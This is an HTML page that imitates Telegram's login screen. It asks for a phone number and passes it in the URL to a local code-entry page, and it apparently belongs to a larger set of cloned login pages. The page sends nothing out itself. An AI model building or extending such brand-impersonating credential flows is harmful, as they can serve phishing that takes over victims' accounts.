<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Login</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background: linear-gradient(135deg, #0088cc 0%, #00a2e8 100%);
            padding: 20px;
        }

        .telegram-container {
            background-color: white;
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
            width: 100%;
            max-width: 400px;
            padding: 40px 30px;
            text-align: center;
        }

        .telegram-header {
            color: #0088cc;
            margin-bottom: 30px;
        }

        .telegram-header i {
            font-size: 48px;
            margin-bottom: 15px;
        }

        .input-group {
            margin-bottom: 20px;
            text-align: left;
        }

        .input-group label {
            display: block;
            margin-bottom: 8px;
            color: #555;
            font-size: 14px;
            font-weight: 500;
        }

        .input-group input {
            width: 100%;
            padding: 12px 15px;
            border: 1px solid #ddd;
            border-radius: 8px;
            font-size: 15px;
            transition: all 0.3s;
        }

        .input-group input:focus {
            border-color: #0088cc;
            box-shadow: 0 0 0 2px rgba(0, 136, 204, 0.2);
            outline: none;
        }

        .telegram-btn {
            width: 100%;
            padding: 12px;
            background: #0088cc;
            border: none;
            border-radius: 8px;
            color: white;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            margin-top: 10px;
        }

        .telegram-btn:hover {
            background: #0077b3;
            transform: translateY(-2px);
        }

        .back-btn {
            margin-top: 15px;
            color: #0088cc;
            text-decoration: none;
            display: inline-block;
        }

        .info-text {
            font-size: 14px;
            color: #666;
            margin-top: 15px;
            line-height: 1.5;
        }
    </style>
</head>
<body>
    <div class="telegram-container">
        <div class="telegram-header">
            <i class="fab fa-telegram"></i>
            <h2>Telegram</h2>
            <p>Enter your phone number to continue</p>
        </div>
        
        <form id="telegramForm">
            <div class="input-group">
                <label for="phone">Phone Number</label>
                <input type="tel" id="phone" name="phone" placeholder="+1 234 567 8900" required>
            </div>
            
            <button type="submit" class="telegram-btn">Receive Code</button>
        </form>
        
        <p class="info-text">We'll send a verification code to your phone via Telegram</p>
        
        <a href="index.html" class="back-btn">‚Üê Back to main login</a>
    </div>

    <script>
        document.getElementById('telegramForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const phone = document.getElementById('phone').value;
            
            if (phone) {
                // Redirect to code verification page with phone number
                window.location.href = `telegram-code.html?phone=${encodeURIComponent(phone)}`;
            } else {
                alert('Please enter your phone number');
            }
        });
    </script>
</body>
</html>
